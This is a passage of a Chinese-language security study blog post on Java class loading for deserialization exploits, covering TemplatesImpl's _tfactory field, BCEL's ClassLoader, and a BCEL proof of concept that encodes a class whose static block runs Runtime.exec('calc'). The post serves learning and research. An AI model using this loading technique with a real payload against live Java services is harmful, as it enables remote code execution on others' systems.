+<h4 id="补充-对于-tfactory参数一些误解的修正"><a href="#补充-对于-tfactory参数一些误解的修正" class="headerlink" title="补充: 对于_tfactory参数一些误解的修正"></a>补充: 对于_tfactory参数一些误解的修正</h4><blockquote>
+<p>对于反序列化和序列化还要<strong>注意一下transient这个修饰符</strong></p>
+</blockquote>
+<ol>
+<li>(新的点)首先，<code>private transient TransformerFactoryImpl _tfactory = null;</code>中这个属性是无法被序列化的，查看该类的readObject()后发现在函数尾部有<code>_tfactory = new TransformerFactoryImpl();</code><ol>
+<li><strong>所以<code>setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</code>有没有都不改变结果</strong></li>
+</ol>
+</li>
+<li>(上面已经发现)其次从顺序角度来看，即使不进行设置，后续由于调用顺序，也会先加载完我们这个类</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span></span><br><span class="line">      <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="literal">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        is.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><h4 id="什么是BCEL"><a href="#什么是BCEL" class="headerlink" title="什么是BCEL"></a>什么是BCEL</h4><blockquote>
+<p>BCEL的特点在于动态加载字节码，defineClass()也是，这里都是反序列化时的中一个重点<br>在Fastjson漏洞中有所利用</p>
+</blockquote>
+<ol>
+<li><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，比Commons Collections特殊的一点是，<strong>它被包含在了原生的JDKcom.sun.org.apache.bcel中</strong></p>
+<ol>
+<li>BCEL 提供了两个核心类，即 com.sun.org.apache.bcel.internal.Repository 和 com.sun.org.apache.bcel.internal.Utility<ol>
+<li>Repository 用于管理已加载的类和其对应的字节码信息，其提供了一个 lookupClass 用以查找已加载的类；</li>
+<li>Utility 则提供了一系列静态方法用于操作字节码，例如对打印或编码字节码。</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>BCEL的主要特点包括: BCEL库提供了一系列用于分析、创建、修改Java Class文件的API</p>
+<ol>
+<li>字节码分析：能够解析已有的.class文件，提取其中的方法、字段、属性等信息。</li>
+<li><strong>字节码生成</strong>：支持从头开始构建新的Java类文件，这在需要动态生成类的场景下非常有用。</li>
+<li><strong>字节码转换</strong>：可以在运行时修改现有的字节码，例如插入额外的指令来实现性能监视或安全性检查。</li>
+<li>字节码优化：可以对字节码进行优化，提高程序执行效率</li>
+</ol>
+</li>
+<li><p>BCEL还实现了自己的ClassLoader: <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，重写了Java内置的ClassLoader#loadClass()方法，并提供了多种对字节码的操作(新方法)</p>
+<ol>
+<li>这里会判断是否为<code>$$BCEL$$</code>开头，然后进入createClass()，进入createClass后会对字节码进行decode()，最终的字节码格式是被BCEL自定义的 –&gt; <strong>所以需要自己的ClassLoader</strong>，在ClassLoader#loadClass()中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。</li>
+<li>p牛说decode()中: “基本可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩”，我就先不看了有需要再来</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line"><span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">     * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">        clazz = createClass(class_name);</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">        <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">          clazz = modifyClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">        cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">        cl = Class.forName(class_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)</span><br><span class="line">      resolveClass(cl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="BCEL前因后果的补充-不重要"><a href="#BCEL前因后果的补充-不重要" class="headerlink" title="BCEL前因后果的补充(不重要"></a>BCEL前因后果的补充(不重要</h4><blockquote>
+<p>补充了一个研究的思路：查看更新日志（修复日志），比如java的bugfixes[<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]">https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]</a></p>
+</blockquote>
+<ol>
+<li>前因<ol>
+<li><strong>内置在jdk？</strong>: 据p牛（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能<ol>
+<li>Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中</li>
+</ol>
+</li>
+<li><strong>什么是JAXP</strong>: JAXP全名是Java API for XML Processing，他是Java定义的一系列接口，用于处理XML相关的逻辑(包括DOM、SAX、StAX、XSLT等)。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler</li>
+<li><strong>什么是XSLT</strong>: XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</li>
+<li><strong>XSLT Compiler</strong>: 是一个命令行编译器，可以<strong>将一个xsl文件编译成一个class文件或jar文件</strong>，编译后的class被称为translet，可以在后续用于对XML文件的转换。 –&gt; <strong>将XSLT的功能转化成了Java代码</strong>，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程</li>
+<li><strong>联系回到AbstactTranslet了</strong>: 之前在TemplatesImpl这条利用链时有使用过，它在defineClass中需要的字节码所对应的基类<ol>
+<li>TemplatesImpl是对JAXP标准中javax.xml.transform.Templates接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么TemplatesImpl会使用defineClass的原因 –&gt; <strong>将xml等的字节码变成可以使用的类</strong></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>后果<ol>
+<li>bcel依赖中还有ClassLoader，但是java中内置的没有了，应该时有再加工</li>
+</ol>
+</li>
+</ol>
+<h4 id="BCEL-poc"><a href="#BCEL-poc" class="headerlink" title="BCEL poc"></a>BCEL poc</h4><blockquote>
+<p>BCEL是由版本限制的<br>BCEL 在 Java 8u251 及之后的版本中无法使用，这是由于在后续的版本中 com.sun.org.apache.bcel.internal.util.ClassLoader 已被移除</p>
+</blockquote>
+<ol>
+<li>在实例化时调用也可以用静态代码块static来实现，在实例化时自动调用，和<strong>构造函数</strong>效果一样<ol>
+<li>在Java安全3(1)中有提到过static的问题<ol>
+<li>Class.forName()在类加载时就执行static块(可选)</li>
+<li>ClassLoader.loadClas()在加载类时不会执行static块，只会在实例化进行</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>这一个poc的关键是<ol>
+<li>使用到了bcel库中自定义的ClassLoader来进行加载，提供了使用bcel的条件</li>
+<li><code>com.sun.org.apache.bcel.internal.Repository</code>和<code>com.sun.org.apache.bcel.internal.classfile.Utility;</code>这两个库</li>
+<li>逻辑：其中 Utility.encode 方法用于将字节数组编码为一个字符串表示形式，如果接受的第二个参数为 true，则会先对字节数组进行 gzip 压缩，然后再进行编码为字符串形式。最后使用bcel的ClassLoader加载类，并实例化触发静态块</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BCELPayload.java 这里需要加入包的标识才可以，可以子本地进行lookup</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELPayload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BCELrce.java poc</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELrce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">jcls</span> <span class="operator">=</span> Repository.lookupClass(BCELPayload.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(jcls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">            System.out.println(code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>java安全漫谈</li>
+<li><a target="_blank" rel="noopener" href="https://0xf4n9x.github.io/java-classloader.html">专门找的博客还是比较对口</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/%5BJava%E5%AE%89%E5%85%A8%5D%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%AD%A6%E4%B9%A0.md">还是信工所大佬</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">p牛 becl</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader"><span class="toc-number">1.</span> <span class="toc-text">ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.1.</span> <span class="toc-text">ClassLoader快速复习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defineClass%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">defineClass加载恶意类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">2.</span> <span class="toc-text">URLClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFURLClassLoader"><span class="toc-number">2.1.</span> <span class="toc-text">什么是URLClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bclass"><span class="toc-number">2.2.</span> <span class="toc-text">URLClassLoader加载远程class</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#defineClass-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">defineClass()调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E5%97%A6%E7%BC%98%E7%94%B1"><span class="toc-number">3.1.</span> <span class="toc-text">细嗦缘由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.2.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFTemplatesImpl"><span class="toc-number">3.2.1.</span> <span class="toc-text">什么是TemplatesImpl?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-poc"><span class="toc-number">3.2.3.</span> <span class="toc-text">TemplatesImpl poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85-%E5%AF%B9%E4%BA%8E-tfactory%E5%8F%82%E6%95%B0%E4%B8%80%E4%BA%9B%E8%AF%AF%E8%A7%A3%E7%9A%84%E4%BF%AE%E6%AD%A3"><span class="toc-number">3.2.4.</span> <span class="toc-text">补充: 对于_tfactory参数一些误解的修正</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL"><span class="toc-number">3.3.</span> <span class="toc-text">BCEL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFBCEL"><span class="toc-number">3.3.1.</span> <span class="toc-text">什么是BCEL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C%E7%9A%84%E8%A1%A5%E5%85%85-%E4%B8%8D%E9%87%8D%E8%A6%81"><span class="toc-number">3.3.2.</span> <span class="toc-text">BCEL前因后果的补充(不重要</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL-poc"><span class="toc-number">3.3.3.</span> <span class="toc-text">BCEL poc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&text=Java安全3(2)_常用加载方法"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&is_video=false&description=Java安全3(2)_常用加载方法"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全3(2)_常用加载方法&body=Check out this article: https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&name=Java安全3(2)_常用加载方法&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&t=Java安全3(2)_常用加载方法"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
